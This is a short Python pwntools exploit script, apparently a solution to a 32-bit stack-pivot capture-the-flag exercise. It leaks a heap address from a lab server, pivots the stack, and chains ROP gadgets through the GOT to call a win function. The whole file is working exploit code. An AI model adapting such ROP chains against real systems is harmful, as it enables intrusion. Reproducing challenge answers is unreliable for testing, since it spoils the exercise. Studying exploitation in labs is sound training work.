#!/usr/bin/env python2
from pwn import *

# remote connection
p = remote("192.168.56.102", 8888)

# useful address
main = p32(0x0804873b)
#puts_plt = p32(0x080485d0)
foothold_got = p32(0x0804a024)
foothold_plt = p32(0x080485f0)

# gadgets
xchg_eax_esp = p32(0x080488c2)
pop_eax = p32(0x080488c0)
pop_ebx = p32(0x08048946)
mov_eax_dleax = p32(0x080488c4)
add_eax_ebx = p32(0x080488c7)
call_eax = p32(0x080486a3) # mov al,junk; add esp,0x10; leave; ret

# Get heap address
leak_addr = p.recvline_contains("The Old Gods").strip().rsplit(' ', 1)[1]
log.info("Leaked heap address is at: " + str(leak_addr))
heap_addr = u32(unhex(leak_addr[2:]), endian='big')

# Stage one: pivot stack to heap address
pay1 = "A"*44
pay1 += pop_eax
pay1 += p32(heap_addr)
pay1 += xchg_eax_esp

''' # Debug: print got entry address
pay2 = foothold_plt
pay2 += puts_plt
pay2 += main
pay2 += foothold_got
print p.recvuntil('>')
p.sendline(pay2)
print p.recvuntil('>')
p.sendline(pay1)
foothold_got = u32(p.recvuntil('pivot by')[-13:-9])
log.info("foothold_got addr: 0x%x" % foothold_got)
'''

# Stage two: calculate ret2win() and call it
pay2 = foothold_plt
pay2 += pop_eax
pay2 += foothold_got # pop foothold_got address into eax
pay2 += mov_eax_dleax # mov foothold_plt address into eax
pay2 += pop_ebx
pay2 += p32(0x1f7) # pop offset into ebx
pay2 += add_eax_ebx # eax now has ret2win_plt address
pay2 += call_eax

p.sendline(pay2)
p.sendline(pay1)
print p.interactive()
